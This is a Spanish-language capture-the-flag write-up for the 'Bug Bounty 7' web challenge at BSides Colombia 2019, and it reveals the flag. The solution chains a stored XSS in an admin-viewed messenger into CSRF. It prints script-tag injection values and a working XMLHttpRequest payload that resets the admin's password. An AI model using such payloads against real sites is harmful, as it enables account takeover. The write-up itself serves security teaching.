# __BSides Colombia 2019__

## _Bug Bounty 7_

## Información

**Categoría:** | **Autor**
--- | ---
Web | Huascar Tejeda <<htejeda@f2tc.com>>

**Descripción:**

> Nos hemos sumado a un programa "Bug Bounty", así que por cada vulnerabilidad habrá una recompensa.
> El objetivo es http://portal.bsides.ctf.co

**Bandera:**

> BSidesCo{bug7_un_CSRF_a_c1Eg4S_3s_cuESt10n_D3_tIeMp0}

## Solución

En la página **Messenger** (vulnerable a XSS) podemos enviar un mensaje que es visto automticamente por el administrador. Lo primero que intentamos fue robar la sesión del administrador, pero el servidor no permite el string "document.cookie". A pesar de que es posible hacer un bypass utilizando varias técnicas para ofuscar el código, existe algún tipo de middleware que limpia el valor de document.cookie antes de enviar el request al servidor malicioso.

Para solucionar este desafío podemos utilizar CSRF para que el lector ejecute un request (no legítimo) para cambiar su contraseña.

***Nota**: El usuario administrador (admin_lfrgn6uu) podemos encontrarlo en el archivo backup.sql*

**Página Profile para cambiar la contraseña de un usuario**:

![](/images/BSidesCo2019/Web/BugBounty7/01.png)

*Request ejemplo:*
```
POST /employee?page=profile.html HTTP/1.1
Host: portal.bsides.ctf.co
Content-Type: application/x-www-form-urlencoded
Cookie: user_session=s%3AvaDjbOLbXFSAfMRckOEOKkCer4hF1yJB.nwdKGI%2BDDBCKm0JSBk78c%2BJqZ6S39y8%2F1QwbV78lnKs
Content-Length: 170

first_name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&last_name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&email=test%40test.com&password=testing123&confirm_password=testing123
```

*Ataque:*

```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST','http://portal.bsides.ctf.co/employee?page=profile.html',true);
    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    xhr.send('username=admin_lfrgn6uu&first_name=admin&last_name=admin&email=admin%40admin.com&password=testing123&confirm_password=testing123');
</script>
```

![](/images/BSidesCo2019/Web/BugBounty7/01.png)

![](/images/BSidesCo2019/Web/BugBounty7/02.png)
